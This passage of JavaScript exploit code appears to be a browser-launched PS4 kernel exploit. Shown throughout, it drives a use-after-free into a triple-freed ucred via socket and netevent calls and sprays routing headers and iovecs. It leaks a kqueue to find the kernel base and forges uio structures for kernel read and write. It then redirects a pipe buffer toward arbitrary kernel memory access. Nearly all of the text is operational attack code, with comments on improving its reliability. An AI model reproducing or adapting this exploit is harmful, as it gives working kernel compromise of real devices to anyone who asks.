      new Uint8Array(outAb).fill(0);
      nameDv.setUint32(0, 1, true);
      nameDv.setUint32(4, 21, true);
      lenDv.setUint32(0, 0x10, true);
      lenDv.setUint32(4, 0, true);
      var rv = sc(SYS.sysctl, nameAddr, 2, outAddr, lenAddr, 0, 0).i32;
      var gotLen = lenDv.getUint32(0, true);
      var o = new DataView(outAb);
      var sec = o.getUint32(0, true);
      if (rv !== 0 || sec === 0) {
        bootErr = "rv=" + rv + " errno=" + errno() + " oldlen=" + gotLen;
        return null;
      }
      return sec.toString(16) + ":" + o.getUint32(8, true).toString(16);
    }
    var boot = bootFingerprint();
    mark("BOOT", boot || bootErr);
    var lastCommitted = null;
    try {
      lastCommitted = localStorage.getItem("ps4lab_committed_boot");
    } catch (e) {}
    if (boot && lastCommitted === boot && params.get("force") !== "1") {
      mark("REFUSING-TO-ARM", "reason=not-rebooted-since-last-committed-run");
      check("console-rebooted-since-last-committed", false, "boot=" + boot + " last=" + lastCommitted + " override=?force=1");
      state("REBOOT FIRST -- this kernel is still poisoned", "bad");
      mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
      return;
    }
    check("console-rebooted-since-last-committed", true, "boot=" + (boot || "none") + " last=" + (lastCommitted || "none"));
    var twins = null,
      triplets = null;

    // ITEM 6(d). `committed` means "kernel state irreversibly touched" --
    // reboot bookkeeping, not a reason to refuse a retry. Gate the loop on
    // whether an alias exists that we could NOT contain. poops.js:4356
    // refuses on that condition, not on "we already fired".
    var uncontained = null;
    var _loop = async function () {
        if (uncontained) {
          mark("NO-RETRY-UNCONTAINED", "attempt=" + attempt + " reason=" + uncontained);
          return 0; // break
        }
        state("attempt " + attempt + "...", "warn");
        mark("ATTEMPT", attempt + "/" + NUM_ATTEMPT);
        var dummy = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
        if (dummy === -1) {
          mark("ATTEMPT-SKIP", "socket failed");
          return 1; // continue
        }
        var reg = netevent(dummy, NETEVENT_SET_QUEUE);
        if (reg.rv === -1) {
          mark("ATTEMPT-SKIP", "SET_QUEUE rv=-1 errno=" + reg.err);
          sc(SYS.close, dummy);
          return 1; // continue
        }
        sc(SYS.close, dummy);
        sc(SYS.setuid, 1);
        uafSock = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
        if (uafSock !== dummy) {
          mark("ATTEMPT-SKIP", "fd not reclaimed: wanted " + dummy + " got " + uafSock);
          if (uafSock !== -1) sc(SYS.close, uafSock);
          uafSock = 0;
          return 1; // continue
        }
        sc(SYS.setuid, 1);
        var clr = netevent(uafSock, NETEVENT_CLEAR_QUEUE);
        mark("UAF-ARMED", "fd=" + uafSock + " clear_rv=" + clr.rv);
        committed = true;
        try {
          if (boot) localStorage.setItem("ps4lab_committed_boot", boot);
        } catch (e) {}
        for (var _i24 = 0; _i24 < 0x80; ++_i24) sc(SYS.sendmsg, 0, msgAddr, 0);
        if (STOP_BEFORE_DOUBLE) {
          mark("STOP-BEFORE-DOUBLE", "withheld=dup+close");
          rebootRequired = true;
          return 0; // break
        }
        var d1 = sc(SYS.dup, uafSock).i32;
        if (d1 === -1) {
          mark("ATTEMPT-SKIP", "dup failed");
          rebootRequired = true;
          return 1; // continue
        }
        sc(SYS.close, d1);
        rebootRequired = true;
        mark("DOUBLE-FREE", "dup=" + d1 + " closed");
        twins = findTwins(MAX_ROUNDS_TWIN);
        if (!twins) {
          // No socket showed a duplicate tag: either the double free did
          // not take, or it did and the scan missed it -- indistinguishable
          // from here (poops.js:4443 says the same). Nothing is KNOWN to be
          // aliased, so there is nothing to burn. Drop the spent fd, retry.
          if (uafSock > 0) {
            sc(SYS.close, uafSock);
            uafSock = 0;
          }
          mark("ATTEMPT-RETRY", "after=no-twins next=" + (attempt + 1) + "/" + NUM_ATTEMPT);
          return 1; // continue
        }
        mark("TWINS", "a=" + twins.a + " b=" + twins.b + " round=" + twins.round);
        freeRthdr(twins.b);
        var reclaimed = false,
          rounds = 0;
        function fireTracked(w) {
          var t = fireW(w, SYS.recvmsg, [iovSs[0], msgAddr, 0], 0);
          t.settled = false;
          t.then(function () {
            t.settled = true;
          }, function () {
            t.settled = true;
          });
          return t;
        }
        var tasks = new Array(iovWorkers.length);
        var parkedSeen = -1;
        for (var _i25 = 0; _i25 < NUM_IOV_SPRAY && !reclaimed; ++_i25) {
          rounds = _i25 + 1;
          for (var _k10 = 0; _k10 < iovWorkers.length; ++_k10) tasks[_k10] = fireTracked(iovWorkers[_k10]);
          sc(SYS.sched_yield);
          if (parkedSeen < 0) {
            await new Promise(function (r) {
              return setTimeout(r, 0);
            });
            parkedSeen = tasks.filter(function (t) {
              return !t.settled;
            }).length;
            mark("IOV-PARKED", parkedSeen + "/" + iovWorkers.length);
          }
          if (getRthdr(twins.a, IP6_RTHDR0_SIZE, 8) >= 0 && leakDv.getInt32(0, true) === 1) {
            reclaimed = true;
            break;
          }
          for (var _k11 = 0; _k11 < iovWorkers.length; ++_k11) sc(SYS.write, iovSs[1], scratch, 1);
          await Promise.all(tasks);
          for (var _k12 = 0; _k12 < iovWorkers.length; ++_k12) sc(SYS.read, iovSs[0], scratch, 1);
        }
        var rets = tasks.map(function (t, k) {
          return iovWorkers[k].ctx.frameDv.getInt32(0, true);
        });
        mark("IOV-RETS", "rounds=" + rounds + " recvmsg_rv=" + rets.join(","));
        check("cr_refcnt-driven-1", reclaimed, "rounds=" + rounds + " parked=" + parkedSeen + "/" + iovWorkers.length);
        if (!reclaimed) {
          // ITEM 6(b). This used to `break`, which is why attempts=8 never
          // produced a second try: 7 of 89 armed runs die exactly here.
          // twins.a/twins.b DO alias the freed chunk now, so a bare retry
          // would re-spray them and free memory another socket owns. Burn
          // them, release the parked racers, drop the spent uafSock, and
          // only then go round again.
          for (var _k13 = 0; _k13 < iovWorkers.length; ++_k13) sc(SYS.write, iovSs[1], scratch, 1);
          await Promise.all(tasks);
          for (var _k14 = 0; _k14 < iovWorkers.length; ++_k14) sc(SYS.read, iovSs[0], scratch, 1);
          burn(twins.a, "refcount-drive");
          burn(twins.b, "refcount-drive");
          twins = null;
          if (uafSock > 0) {
            sc(SYS.close, uafSock);
            uafSock = 0;
          }
          mark("ATTEMPT-RETRY", "after=refcount-drive burned=" + burned.size + " next=" + (attempt + 1) + "/" + NUM_ATTEMPT);
          return 1; // continue
        }
        var d2 = sc(SYS.dup, uafSock).i32;
        if (d2 === -1) {
          mark("ATTEMPT-SKIP", "second dup failed");
          return 0; // break
        }
        sc(SYS.close, d2);
        mark("TRIPLE-FREE", "dup=" + d2 + " closed");
        var t0 = twins.a;
        var ptOk = getRthdr(t0, IP6_RTHDR0_SIZE, 8) >= 0;
        mark("POST-TRIPLE", "master=" + t0 + " twin=" + twins.b + " idx=" + (ptOk ? leakDv.getInt32(4, true) : "readfail") + " refcnt=" + (ptOk ? leakDv.getInt32(0, true) : "readfail"));
        var t1 = findTriplet(t0, -1, "T1", MAX_ROUNDS_TRIPLET);
        for (var _k15 = 0; _k15 < iovWorkers.length; ++_k15) sc(SYS.write, iovSs[1], scratch, 1);
        await Promise.all(tasks);
        for (var _k16 = 0; _k16 < iovWorkers.length; ++_k16) sc(SYS.read, iovSs[0], scratch, 1);
        var rets2 = tasks.map(function (t, k) {
          return iovWorkers[k].ctx.frameDv.getInt32(0, true);
        });
        var irOk = getRthdr(t0, IP6_RTHDR0_SIZE, 8) >= 0;
        mark("IOV-RELEASED", "recvmsg_rv=" + rets2.join(",") + " master_idx=" + (irOk ? leakDv.getInt32(4, true) : "readfail"));
        var t2 = findTriplet(t0, t1, "T2", MAX_ROUNDS_TRIPLET);
        if (t1 && t2) {
          triplets = [t0, t1, t2];
          mark("TRIPLETS", triplets.join(","));
        } else {
          // A triple free happened and we could not name all three owners,
          // so we cannot burn what we cannot identify. This is the one path
          // that must NOT retry -- poops.js:4356 refuses here too.
          mark("TRIPLET-MISS", "t1=" + t1 + " t2=" + t2);
          burn(t0, "triplet-miss");
          if (t1) burn(t1, "triplet-miss");
          if (twins && twins.b) burn(twins.b, "triplet-miss");
          uncontained = "triplet-miss";
        }
      },
      _ret;
    for (var attempt = 1; attempt <= NUM_ATTEMPT && !triplets; ++attempt) {
      _ret = await _loop();
      if (_ret === 0) break;
      if (_ret === 1) continue;
    }
    check("ucred-triple-freed", !!triplets, triplets ? triplets.join(",") : "");
    var kernelBase = null,
      kqFdp = null,
      kqFd = -1;
    if (triplets) {
      if (off.k_kl_lock === undefined || off.k_kl_lock === 0) {
        mark("KQUEUE-SKIPPED", "reason=no-k_kl_lock");
      } else {
        state("leaking a kqueue...", "warn");
        freeRthdr(triplets[2]);
        sc(SYS.sched_yield);
        sc(SYS.sched_yield);
        var leaked = false,
          tries = 0,
          magicNoFdp = 0,
          shortRead = 0;
        var held = [];
        for (var _i0 = 0; _i0 < NUM_LEAK_KQUEUE; ++_i0) {
          tries = _i0 + 1;
          var kq = sc(SYS.kqueue).i32;
          if (kq === -1) {
            mark("KQUEUE-EMFILE", "at=" + _i0 + " held=" + held.length);
            while (held.length) sc(SYS.close, held.pop());
            sc(SYS.sched_yield);
            continue;
          }
          held.push(kq);
          var got = getRthdr(triplets[0], KQUEUE_SIZE, 0xa0);
          if (got < 0xa0) shortRead++;
          var fdpLo = leakDv.getUint32(0x98, true);
          var fdpHi = leakDv.getUint32(0x9c, true);
          var magicOk = got >= 0xa0 && leakDv.getUint32(8, true) === KQ_HDR_MAGIC && leakDv.getUint32(12, true) === 0;
          if (magicOk && (fdpLo !== 0 || fdpHi !== 0)) {
            kqFd = held.pop();
            leaked = true;
            break;
          }
          if (magicOk) magicNoFdp++;
          if (held.length >= KQ_BATCH) {
            while (held.length) sc(SYS.close, held.pop());
            sc(SYS.sched_yield);
          }
          if (_i0 && _i0 % 500 === 0) mark("KQUEUE-ROUND", "i=" + _i0 + " magic_no_fdp=" + magicNoFdp + " short=" + shortRead);
        }
        while (held.length) sc(SYS.close, held.pop());
        check("kqueue-reclaimed-freed-chunk", leaked, "tries=" + tries + " magic_no_fdp=" + magicNoFdp + " short_reads=" + shortRead + (leaked ? " fd=" + kqFd : ""));
        if (leaked) {
          var klLock = new int64(leakDv.getUint32(0x60, true), leakDv.getUint32(0x64, true));
          kqFdp = new int64(leakDv.getUint32(0x98, true), leakDv.getUint32(0x9c, true));
          kernelBase = klLock.sub32(off.k_kl_lock);
          mark("KQUEUE-LEAK", "kl_lock=" + klLock + " kq_fdp=" + kqFdp);
          mark("KERNEL-BASE", kernelBase + " = kl_lock-0x" + off.k_kl_lock.toString(16));
          try {
            var kbNow = "" + kernelBase;
            var kbLast = localStorage.getItem("ps4lab_kernel_base");
            if (kbLast === kbNow) mark("SAME-BOOT-AS-LAST-RUN", "kernel_base=" + kbNow);
            localStorage.setItem("ps4lab_kernel_base", kbNow);
          } catch (e) {}
          check("kl_lock-kq_fdp-kernel-pointers", klLock.hi >>> 0 === 0xffffffff && kqFdp.hi >>> 0 >= 0xffff0000, "kl_lock.hi=" + hx(klLock.hi) + " kq_fdp.hi=" + hx(kqFdp.hi));
          check("kernel-base-0x4000-aligned", (kernelBase.low & 0x3fff) === 0, "low=" + hx(kernelBase.low));
          sc(SYS.close, kqFd);
          triplets[2] = findTriplet(triplets[0], triplets[1], "KQ", MAX_ROUNDS_TRIPLET);
          mark("POST-KQUEUE", "kq_fd=" + kqFd + " closed triplets=" + triplets.join(","));
          check("triplets2-re-found-after-kqueue-leak", !!triplets[2], triplets.join(","));
        }
      }
    }
    function fakeUio(uioIov, resid, rw) {
      new Uint8Array(iovAb).fill(0);
      put(iovDv, 0x00, uioIov);
      iovDv.setUint32(0x08, NUM_UIO_IOV, true);
      put(iovDv, 0x10, -1);
      put(iovDv, 0x18, resid);
      iovDv.setUint32(0x20, UIO_SYSSPACE, true);
      iovDv.setUint32(0x24, rw, true);
      put(iovDv, 0x28, 0);
    }
    function restoreRefcntIov() {
      new Uint8Array(iovAb).fill(0);
      put(iovDv, 0, 1);
      put(iovDv, 8, 1);
    }
    async function landUio(size, forWrite, tasks) {
      if (!tripletsUsable()) {
        mark("UIO-LAND-REFUSED", "triplets=" + triplets.join(","));
        return null;
      }
      trace("UIO-LAND", "call=" + (forWrite ? "readv" : "writev") + " size=" + size);
      freeRthdr(triplets[2]);
      // ITEM 5a. landFakeUio has a deadline; this one did not, so a run
      // where the chunk is never re-taken spins all NUM_UIO_SPRAY rounds
      // and only then unwinds. Bound it the same way. poops.js:4640.
      var uioDeadline = Date.now() + (params.has("uioms") ? parseInt(params.get("uioms"), 10) : 30000);
      for (var _i1 = 0; _i1 < NUM_UIO_SPRAY; ++_i1) {
        if ((_i1 & 0x3f) === 0 && Date.now() > uioDeadline) {
          mark("UIO-LAND-TIMEOUT", "rounds=" + _i1);
          break;
        }
        if (_i1 && _i1 % 256 === 0) mark("UIO-LAND-ROUND", "i=" + _i1);
        for (var _k2 = 0; _k2 < uioWorkers.length; ++_k2) tasks[_k2] = fireW(uioWorkers[_k2], forWrite ? SYS.readv : SYS.writev, [forWrite ? uioSs[0] : uioSs[1], uioIovAddr, NUM_UIO_IOV], 0);
        sc(SYS.sched_yield);
        if (getRthdr(triplets[0], IOVEC_SIZE) >= 0 && leakDv.getInt32(8, true) === NUM_UIO_IOV) {
          return new int64(leakDv.getUint32(0, true), leakDv.getUint32(4, true));
        }
        if (forWrite) {
          for (var _k3 = 0; _k3 < uioWorkers.length; ++_k3) sc(SYS.write, uioSs[1], scratch, size);
        } else {
          sc(SYS.read, uioSs[0], scratch, size);
          for (var _k4 = 0; _k4 < uioWorkers.length; ++_k4) sc(SYS.read, uioSs[0], scratch, size);
        }
        await Promise.all(tasks);
        if (!forWrite) sc(SYS.write, uioSs[1], scratch, size);
      }
      return null;
    }
    async function landFakeUio(tasks) {
      if (!tripletsUsable()) {
        mark("FAKEUIO-REFUSED", "triplets=" + triplets.join(","));
        return false;
      }
      trace("FAKEUIO-LAND", "target=" + triplets[0] + " freed=" + triplets[1]);
      freeRthdr(triplets[1]);
      var fakeDeadline = Date.now() + (params.has("fakeuioms") ? parseInt(params.get("fakeuioms"), 10) : 30000);
      for (var _i10 = 0; _i10 < NUM_IOV_SPRAY_MAX; ++_i10) {
        if ((_i10 & 0x3f) === 0 && Date.now() > fakeDeadline) {
          mark("FAKEUIO-TIMEOUT", "rounds=" + _i10);
          break;
        }
        if (_i10 && _i10 % 500 === 0) mark("FAKEUIO-ROUND", "i=" + _i10);
        for (var _k5 = 0; _k5 < iovWorkers.length; ++_k5) tasks[_k5] = fireW(iovWorkers[_k5], SYS.recvmsg, [iovSs[0], msgAddr, 0], 0);
        sc(SYS.sched_yield);
        if (getRthdr(triplets[0], UIO_SIZE + IOVEC_SIZE) >= 0 && leakDv.getUint32(0x20, true) === UIO_SYSSPACE) return true;
        for (var _k6 = 0; _k6 < iovWorkers.length; ++_k6) sc(SYS.write, iovSs[1], scratch, 1);
        await Promise.all(tasks);
        for (var _k7 = 0; _k7 < iovWorkers.length; ++_k7) sc(SYS.read, iovSs[0], scratch, 1);
      }
      return false;
    }
    function tripletsUsable() {
      return triplets && triplets.length === 3 && triplets.every(function (fd) {
        return fd > 0 && ipv6.indexOf(fd) >= 0;
      });
    }
    async function releaseIov(itasks) {
      for (var _k8 = 0; _k8 < iovWorkers.length; ++_k8) sc(SYS.write, iovSs[1], scratch, 1);
      await Promise.all(itasks);
      for (var _k9 = 0; _k9 < iovWorkers.length; ++_k9) sc(SYS.read, iovSs[0], scratch, 1);
    }

    // ITEM 3. tripletsUsable() only checks the three fds are non-zero and
    // in the pool -- it never reads a single one back. Every getRthdr in
    // the race path targets the MASTER only, so a slave that is no longer
    // aliased is indistinguishable from one that is, and we then spend a
    // full UAF re-roll on it. 14 of 28 cut-off runs die at or after a
    // refind. poops.js:9381-9445 validates all three independently before
    // trusting them; this is that check.
    function tripletsAgree(why) {
      if (!tripletsUsable()) return false;
      var tags = [];
      for (var fd of triplets) {
        if (getRthdr(fd, UCRED_SIZE, 8) < 0) {
          trace("TRIPLET-VALIDATE", why + " fd=" + fd + " short-read");
          return false;
        }
        var _v2 = leakDv.getUint32(4, true) >>> 0;
        if ((_v2 & 0xffff0000) >>> 0 !== RTHDR_TAG) {
          trace("TRIPLET-VALIDATE", why + " fd=" + fd + " untagged=" + hx(_v2));
          return false;
        }
        tags.push(_v2);
      }
      // All three must be reading the SAME chunk, i.e. the same tag.
      var agree = tags[0] === tags[1] && tags[1] === tags[2];
      if (!agree) trace("TRIPLET-VALIDATE", why + " disagree " + tags.map(hx).join(","));
      return agree;
    }
    function refindPair(tag) {
      for (var retry = 0; retry < 3; ++retry) {
        triplets[1] = findTriplet(triplets[0], -1, tag + "1", FIND_TRIPLET_FAST);
        triplets[2] = findTriplet(triplets[0], triplets[1], tag + "2", FIND_TRIPLET_FAST);
        if (tripletsUsable() && tripletsAgree(tag)) return true;
        sc(SYS.sched_yield);
      }
      mark("REFIND-UNVALIDATED", "tag=" + tag + " triplets=" + triplets.join(","));
      return false;
    }
    async function refindTriplets(itasks) {
      await releaseIov(itasks);
      if (refindPair("RE")) return true;
      mark("TRIPLETS-LOST", "triplets=" + triplets.join(","));
      return false;
    }
    async function unwind(utasks, itasks, why, wakeUio, size, drainReads) {
      mark("KREAD-UNWIND", "why=" + why + " wake_uio=" + (wakeUio ? 1 : 0));
      try {
        if (wakeUio && utasks && utasks[0]) {
          // THE ONLY UNBOUNDED BLOCK IN THIS FILE, now bounded.
          // uioSs is a blocking AF_UNIX socketpair -- no O_NONBLOCK,
          // no SO_RCVTIMEO -- and sc() is a synchronous syscall on the
          // main JS thread, so one read past the available bytes parks
          // the WebProcess forever and the console has to be pulled.
          //
          // This is only reached when landUio EXHAUSTED its rounds,
          // and every round ends with await Promise.all(tasks), so no
          // racer is parked and there is nothing to wake. What is left
          // is exactly the re-prefill: `size` bytes on the read side
          // (landUio re-primes at its round tail) and NOTHING on the
          // write side (forWrite skips that prime, and its racers are
          // readv()-ers). So: one read, or none. Never N+1.
          // The old code asked for (N+1)*8 and hung just as hard --
          // it only ever survived because this path is rare.
          var dsz = size || 8;
          for (var _k0 = 0; _k0 < (drainReads || 0); ++_k0) sc(SYS.read, uioSs[0], scratch, dsz);
          await Promise.all(utasks);
        }
      } catch (e) {
        mark("UNWIND-UIO-THREW", e.message);
      }
      try {
        if (itasks && itasks[0]) await releaseIov(itasks);
      } catch (e) {
        mark("UNWIND-IOV-THREW", e.message);
      }
      restoreRefcntIov();
      var ok = refindPair("UW");
      mark("KREAD-UNWOUND", "triplets=" + triplets.join(",") + " usable=" + ok);
      return ok;
    }

    // `pairs` (optional) = [{addr,size},...] gathered into ONE forged uio.
    // `size` must be the sum. iovAb is 0x170 = [uio 0x30][20 iovec slots],
    // uio_iovcnt is already NUM_UIO_IOV (0x14), and fakeUio zero-fills, so
    // slots 1..19 are in-bounds and inert unless populated here.
    // ITEM 2. Refuse to spend a slow op on an address that cannot be a
    // kernel pointer. Without this, a kread that returned all zeros gave
    // int64(0,0) -- which is TRUTHY -- so the walk carried on and issued a
    // read at ~0x270 through a UIO_SYSSPACE uio inside writev: a near-NULL
    // kernel dereference. poops.js:4800-4807 gates the same way.
    var isKptr = function (v) {
      return !!v && v.hi >>> 0 >= 0xffff0000;
    };
    var kAligned = function (v) {
      return !!v && (v.low >>> 0 & 7) === 0;
    };
    function kaddrOk(v) {
      return isKptr(v) && kAligned(v);
    }
    async function kreadSlow(addr, size, pairs) {
      if (kreadPoisoned) {
        mark("KREAD-REFUSED", "reason=poisoned");
        return null;
      }
      if (pairs) {
        for (var q of pairs) if (!kaddrOk(q.addr)) {
          mark("KREAD-REFUSED", "bad-pair-addr=" + q.addr);
          return null;
        }
      } else if (!kaddrOk(addr)) {
        mark("KREAD-REFUSED", "bad-addr=" + addr);
        return null;
      }
      if (!tripletsUsable()) {
        mark("KREAD-REFUSED", "triplets=" + triplets.join(","));
        return null;
      }
      if (pairs && pairs.length > NUM_UIO_IOV) {
        mark("KREAD-REFUSED", "pairs=" + pairs.length + " > " + NUM_UIO_IOV);
        return null;
      }
      mark("KREAD-BEGIN", "addr=" + (pairs ? pairs.map(function (p2) {
        return "" + p2.addr;
      }).join("+") : addr) + " size=" + size);
      var bufs = uioWorkers.map(function () {
        var ab = new ArrayBuffer(size);
        chainKeepAlive.push(ab);
        // ITEM 2. Sentinel-fill so an EMPTY read is distinguishable
        // from a real read of a zero qword. A fresh buffer is all
        // zeros, which used to sail through the hit test below and
        // return int64(0,0) as if it were kernel data.
        new Uint8Array(ab).fill(0x41);
        return {
          ab: ab,
          addr: bufAddr(ab),
          dv: new DataView(ab)
        };
      });
      lenDv.setUint32(0, size, true);
      sc(SYS.setsockopt, uioSs[1], SOL_SOCKET, SO_SNDBUF, lenAddr, 4);
      sc(SYS.write, uioSs[1], scratch, size);
      put(uioIovDv, 8, size);
      var utasks = new Array(uioWorkers.length);
      var uioIov = await landUio(size, false, utasks);
      if (!uioIov) {
        await unwind(utasks, null, "no-uio", true, size, 1);
        return null;
      }
      trace("UIO-LANDED", "uio_iov=" + uioIov);
      fakeUio(uioIov, size, UIO_WRITE);
      if (pairs) {
        for (var _i11 = 0; _i11 < pairs.length; ++_i11) {
          put(iovDv, 0x30 + IOVEC_SIZE * _i11, pairs[_i11].addr);
          put(iovDv, 0x38 + IOVEC_SIZE * _i11, pairs[_i11].size);
        }
      } else {
        put(iovDv, 0x30, addr);
        put(iovDv, 0x38, size);
      }
      var itasks = new Array(iovWorkers.length);
      var ok = await landFakeUio(itasks);
      if (!ok) {
        kreadPoisoned = true;
        await unwind(utasks, itasks, "no-fake-uio", false, size);
        return null;
      }
      trace("KREAD-WAKE", "src=" + addr);
      sc(SYS.read, uioSs[0], scratch, size);
      var got = null,
        drained = 0;
      for (var b of bufs) {
        sc(SYS.read, uioSs[0], b.addr, size);
        drained++;
        if (!got && !(b.dv.getUint32(0, true) === 0x41414141 && b.dv.getUint32(4, true) === 0x41414141)) got = b.dv;
      }
      trace("KREAD-DRAINED", "bufs=" + drained + "/" + bufs.length + " hit=" + (got ? 1 : 0));
      await Promise.all(utasks);
      trace("KREAD-UIO-JOINED", "");
      restoreRefcntIov();
      await refindTriplets(itasks);
      return got;
    }
    async function kwriteSlow(dst, srcAddr, size) {
      if (kreadPoisoned) {
        mark("KWRITE-REFUSED", "reason=poisoned");
        return false;
      }
      if (!kaddrOk(dst)) {
        mark("KWRITE-REFUSED", "bad-dst=" + dst);
        return false;
      }
      if (!tripletsUsable()) {
        mark("KWRITE-REFUSED", "triplets=" + triplets.join(","));
        return false;
      }
      mark("KWRITE-BEGIN", "dst=" + dst + " size=" + size);
      lenDv.setUint32(0, size, true);
      sc(SYS.setsockopt, uioSs[1], SOL_SOCKET, SO_SNDBUF, lenAddr, 4);
      put(uioIovDv, 8, size);
      var utasks = new Array(uioWorkers.length);
      var uioIov = await landUio(size, true, utasks);
      if (!uioIov) {
        await unwind(utasks, null, "no-uio", true, size, 0);
        return false;
      }
      fakeUio(uioIov, size, UIO_READ);
      put(iovDv, 0x30, dst);
      put(iovDv, 0x38, size);
      var itasks = new Array(iovWorkers.length);
      var ok = await landFakeUio(itasks);
      if (!ok) {
        kreadPoisoned = true;
        await unwind(utasks, itasks, "no-fake-uio", false, size);
        return false;
      }
      for (var _k1 = 0; _k1 < uioWorkers.length; ++_k1) sc(SYS.write, uioSs[1], srcAddr, size);
      await Promise.all(utasks);
      restoreRefcntIov();
      await refindTriplets(itasks);
      return true;
    }

    // R1. This read proves nothing the pipe primitive does not prove better,
    // and it is slow op #1 of 7 -- one full UAF re-roll at ~3.1% death for a
    // check that is repeated at :kernelview-reads-kernel-elf-header on the
    // FAST primitive, before the first kernel write. poops.js:8672 runs its
    // ELF proof on kread64Fast for exactly this reason, and poops.js:6063
    // records deleting the equivalent slow read. `kernelBase` is still
    // required below, so the gate on it stays.
    var R1_ON = params.get("r1") !== "0";
    if (!R1_ON && kernelBase && triplets) {
      state("kread_slow...", "warn");
      var _got = await kreadSlow(kernelBase, 0x20);
      if (_got) {
        var b = [];
        for (var _i12 = 0; _i12 < 16; ++_i12) b.push(_got.getUint8(_i12));
        mark("KREAD", "kernel_base -> " + b.map(function (v) {
          return v.toString(16).padStart(2, "0");
        }).join(" "));
        check("kread_slow-reads-kernel-elf-header", _got.getUint32(0, true) === 0x464c457f, "e_type=" + _got.getUint16(0x10, true) + " e_machine=" + hx(_got.getUint16(0x12, true)));
      } else check("kread_slow-returned-data", false, "");
    }
    var kv = null;
    if (kernelBase && triplets && kqFdp) {
      state("make_karw...", "warn");
      mark("SHORT-READS", "n=" + shortReads + " gate=" + (R2_ON ? 1 : 0));
      var KREAD_TRIES = params.has("kreadtries") ? parseInt(params.get("kreadtries"), 10) : 4;
      async function kread8(a) {
        for (var t = 0; t < KREAD_TRIES; ++t) {
          if (t) mark("KREAD-RETRY", "addr=" + a + " try=" + (t + 1));
          var dv = await kreadSlow(a, 8);
          if (dv) return new int64(dv.getUint32(0, true), dv.getUint32(4, true));
          if (kreadPoisoned || !tripletsUsable()) break;
        }
        return null;
      }
      async function kwrite8n(dst, srcAddr, n) {
        for (var t = 0; t < KREAD_TRIES; ++t) {
          if (t) mark("KWRITE-RETRY", "dst=" + dst + " try=" + (t + 1));
          if (await kwriteSlow(dst, srcAddr, n)) return true;
          if (kreadPoisoned || !tripletsUsable()) break;
        }
        return false;
      }
      // R3/R4 helpers. Same retry discipline as kread8 -- do NOT drop it.
      var qw = function (dv, o) {
        return new int64(dv.getUint32(o, true), dv.getUint32(o + 4, true));
      };
      async function kreadN(a, n) {
        for (var t = 0; t < KREAD_TRIES; ++t) {
          if (t) mark("KREAD-RETRY", "addr=" + a + " n=" + n + " try=" + (t + 1));
          var dv = await kreadSlow(a, n);
          if (dv) return dv;
          if (kreadPoisoned || !tripletsUsable()) break;
        }
        return null;
      }
      // R4. One window, two non-adjacent addresses, via extra iovec slots
      // in the forged uio. poops.js:4909-4930 buildUioPairs / :4947-5010.
      async function kreadPairs(pairs) {
        var total = 0;
        for (var p2 of pairs) total += p2.size;
        for (var t = 0; t < KREAD_TRIES; ++t) {
          if (t) mark("KREAD-RETRY", "pairs=" + pairs.length + " try=" + (t + 1));
          var dv = await kreadSlow(null, total, pairs);
          if (dv) return dv;
          if (kreadPoisoned || !tripletsUsable()) break;
        }
        return null;
      }
      var R3_ON = params.get("r3") !== "0";
      var R4_ON = params.get("r4") !== "0";
      var fdtOfiles = await kread8(kqFdp);
      mark("FDT-OFILES", "" + fdtOfiles);

      // R3. mFp and sFp are FILEDESCENT_SIZE apart in one live ofiles
      // span, so one 0x20 read replaces two windows. pipe() at :387/:389
      // are back-to-back with no intervening fd allocation, so the two
      // low fds are always 2 apart -- 44/44 in the log. Verified, not
      // assumed, and it falls back if the console ever disagrees.
      var mFp = null,
        sFp = null;
      var fdDelta = slavePipe[0] - masterPipe[0];
      var spanOk = R3_ON && fdtOfiles && fdDelta > 0 && (fdDelta + 1) * FILEDESCENT_SIZE <= 0x20;
      if (spanOk) {
        var span = await kreadN(fdtOfiles.add32(masterPipe[0] * FILEDESCENT_SIZE), 0x20);
        if (span) {
          mFp = qw(span, 0);
          sFp = qw(span, fdDelta * FILEDESCENT_SIZE);
        } else mark("PIPE-FP-SPAN-MISS", "delta=" + fdDelta);
      }
      if (!mFp && fdtOfiles && !kreadPoisoned && tripletsUsable()) {
        if (spanOk) mark("PIPE-FP-FALLBACK", "two single reads");
        mFp = await kread8(fdtOfiles.add32(masterPipe[0] * FILEDESCENT_SIZE));
        sFp = await kread8(fdtOfiles.add32(slavePipe[0] * FILEDESCENT_SIZE));
      }
      mark("PIPE-FP", "master=" + (mFp || "?") + " slave=" + (sFp || "?") + " delta=" + fdDelta + " span=" + (spanOk ? 1 : 0));

      // R4. f_data of the two struct files: unrelated addresses, so a
      // contiguous read cannot help -- this needs the scatter.
      var mData = null,
        sData = null;
      if (R4_ON && mFp && sFp) {
        var both = await kreadPairs([{
          addr: mFp,
          size: 8
        }, {
          addr: sFp,
          size: 8
        }]);
        if (both) {
          mData = qw(both, 0);
          sData = qw(both, 8);
        } else mark("PIPE-FDATA-SCATTER-MISS", "");
      }
      if (!mData && !kreadPoisoned && tripletsUsable()) {
        if (R4_ON && mFp && sFp) mark("PIPE-FDATA-FALLBACK", "two reads");
        mData = mFp ? await kread8(mFp) : null;
        sData = sFp ? await kread8(sFp) : null;
      }
      mark("PIPE-FDATA", "master=" + (mData || "?") + " slave=" + (sData || "?"));
      var kptr = function (v) {
        return v && v.hi >>> 0 >= 0xffff0000;
      };
      // R8. Two distinct struct files cannot share f_data. Equal values
      // mean the alias was misidentified, and aiming a pipebuf at itself
      // is not something that fails cleanly. POOPS.LUA:1068 aborts here.
      if (kptr(mData) && kptr(sData) && mData.low === sData.low && mData.hi === sData.hi) {
        check("pipe-fdata-distinct", false, "both=" + mData);
        mark("MAKE-KARW-ABORTED", "reason=mdata-equals-sdata");
        mData = null;
      }
      if (!check("ofiles-walk-reached-pipes", kptr(fdtOfiles) && kptr(mFp) && kptr(sFp) && kptr(mData) && kptr(sData), "")) {
        mark("MAKE-KARW-ABORTED", "reason=walk-not-kernel-pointers");
      } else {
        var pbAb = new ArrayBuffer(PIPEBUF_SIZEOF);
        chainKeepAlive.push(pbAb);
        var pbAddr = bufAddr(pbAb),
          pbDv = new DataView(pbAb);
        new Uint8Array(pbAb).fill(0);
        pbDv.setUint32(0x0c, PIPE_PAGE, true);
        put(pbDv, 0x10, sData);
        mark("PIPEBUF-AIM", "at=" + mData + " size=0x" + PIPE_PAGE.toString(16) + " buffer=" + sData);
        var wrote = await kwrite8n(mData, pbAddr, PIPEBUF_SIZEOF);
